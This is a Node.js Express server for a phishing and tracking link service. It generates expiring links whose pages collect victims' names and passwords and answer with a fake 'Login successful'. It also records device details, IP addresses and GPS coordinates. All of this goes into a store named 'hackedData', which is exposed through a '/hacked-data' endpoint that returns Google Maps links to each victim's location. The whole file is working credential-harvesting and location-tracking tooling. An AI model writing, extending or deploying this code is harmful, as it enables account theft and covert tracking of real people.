
const express = require('express');
const bodyParser = require('body-parser');
const crypto = require('crypto');

const app = express();
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(bodyParser.json({ limit: '50mb' }));
app.set('trust proxy', true);
app.set('view engine', 'ejs');

const links = new Map();
const hackedData = new Map();
const locationData = new Map();
const users = new Map(); // Store user credentials
const sessions = new Map(); // Store active sessions

function generateNewId(type) {
  const id = crypto.randomBytes(4).toString('hex');
  const expiresAt = Date.now() + (12 * 60 * 60 * 1000); // 12 hours
  links.set(id, { type, createdAt: new Date().toISOString(), expiresAt });
  return id;
}

function isLinkExpired(id) {
  const link = links.get(id);
  return !link || Date.now() > link.expiresAt;
}

function createExpirationTimer(id) {
  setTimeout(() => {
    if (links.has(id)) {
      const data = links.get(id);
      if (data.name) {
        hackedData.set(id, { ...data, expiresAt: Date.now() + (12 * 60 * 60 * 1000) });
      }
      links.delete(id);
      console.log(`Data for ${id} moved to hacked data storage`);
      
      // Delete from hacked data after 12 hours
      setTimeout(() => {
        hackedData.delete(id);
        console.log(`Hacked data for ${id} deleted after 12 hours`);
      }, 12 * 60 * 60 * 1000);
    }
  }, 30 * 60 * 1000);
}

// Authentication middleware
const authenticateUser = (req, res, next) => {
  const sessionId = req.headers['authorization'];
  if (sessions.has(sessionId)) {
    req.user = sessions.get(sessionId);
    next();
  } else {
    res.status(401).json({ error: 'Unauthorized' });
  }
};

app.post('/register', (req, res) => {
  const { username, password } = req.body;
  if (users.has(username)) {
    return res.status(400).json({ error: 'Username taken' });
  }
  users.set(username, { password, links: [] });
  res.json({ success: true });
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = users.get(username);
  if (user && user.password === password) {
    const sessionId = crypto.randomBytes(16).toString('hex');
    sessions.set(sessionId, username);
    res.json({ sessionId });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.get('/', (req, res) => {
  res.render('generate');
});

app.post('/generate', (req, res) => {
  const { type } = req.body;
  const id = generateNewId(type);
  createExpirationTimer(id);
  res.json({ link: `/link/${id}` });
});

app.get('/link/:id', (req, res) => {
  const { id } = req.params;
  if (isLinkExpired(id)) {
    return res.status(404).send('Link expired');
  }
  const data = links.get(id);
  if (req.headers.accept === 'application/json') {
    return res.json(data);
  }
  if (data.type === 'device-info') {
    return res.render('device-info', { id });
  }
  res.render('name', { id, type: data.type });
});

app.post('/link/:id', async (req, res) => {
  try {
    const { id } = req.params;
    
    if (!links.has(id)) {
      return res.status(404).json({ error: 'Link not found or expired' });
    }

    const linkData = links.get(id);
    if (linkData.type === 'device-info') {
      const data = {
        ...req.body,
        timestamp: new Date().toISOString(),
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        expiresAt: Date.now() + (12 * 60 * 60 * 1000)
      };
      hackedData.set(id, data);
      return res.json({ success: true });
    }

    if (!req.body || !req.body.name || !req.body.password) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const data = {
      ...req.body,
      timestamp: new Date().toISOString(),
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
      expiresAt: Date.now() + (12 * 60 * 60 * 1000) // 12 hours from now
    };
    
    // Store in both links and hackedData immediately
    links.set(id, data);
    hackedData.set(id, { ...data, expiresAt: Date.now() + (12 * 60 * 60 * 1000) });
    
    res.json({ 
      success: true,
      message: 'Login successful',
      ...data 
    });
  } catch (error) {
    console.error('Error processing login:', error);
    res.status(500).json({ error: 'Server error, please try again' });
  }
});

app.delete('/hacked-data', (req, res) => {
  try {
    hackedData.clear();
    res.json({ success: true, message: 'All data deleted' });
  } catch (error) {
    console.error('Error deleting data:', error);
    res.status(500).json({ error: 'Error deleting data' });
  }
});



app.get('/hacked-data', (req, res) => {
  try {
    const currentTime = Date.now();
    const allData = Array.from(hackedData.entries())
      .filter(([_, data]) => data.expiresAt > currentTime)
      .map(([id, data]) => {
        let locationInfo = 'Location not available';
        let locationUrl = null;
        
        if (data.location) {
          locationInfo = `Location: ${data.location.latitude}°, ${data.location.longitude}°`;
          locationUrl = `https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude}`;
        }
        
        return {
          id,
          ...data,
          locationInfo,
          locationUrl,
          timeLeft: Math.max(0, Math.floor((data.expiresAt - currentTime) / (1000 * 60 * 60))) + ' hours left'
        };
      });

    res.json({ success: true, data: allData });
  } catch (error) {
    console.error('Error fetching hacked data:', error);
    res.status(500).json({ error: 'Error fetching data' });
  }
});

// Add a health check endpoint
app.get('/health', (_, res) => res.json({ status: 'ok' }));

app.listen(5000, '0.0.0.0', () => {
  console.log('Server running on port 5000');
});
